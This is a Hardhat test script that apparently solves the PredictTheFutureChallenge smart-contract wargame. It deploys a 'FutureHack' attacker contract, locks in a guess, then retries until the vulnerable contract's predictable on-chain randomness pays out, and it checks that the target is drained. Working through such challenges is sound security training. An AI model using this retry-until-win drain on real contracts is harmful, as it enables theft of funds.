import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);

  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */

    // deploy the hack contract and connect it to the target contract 
    const hack = await (
      await ethers.getContractFactory('FutureHack', deployer)
    ).deploy(target.address);

    await hack.deployed();




     const guess = await hack.lockInGuess({value: utils.parseEther('1')});
    await guess.wait();

    while(!(await target.isComplete())) {
      try{
        const guessTx = await hack.hackGuess();
        await guessTx.wait();
      } catch (err) {
        console.log(err);
      }

      const blockNumber = await provider.getBlockNumber();
      console.log(`Current block number: ${blockNumber}`);

    }

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
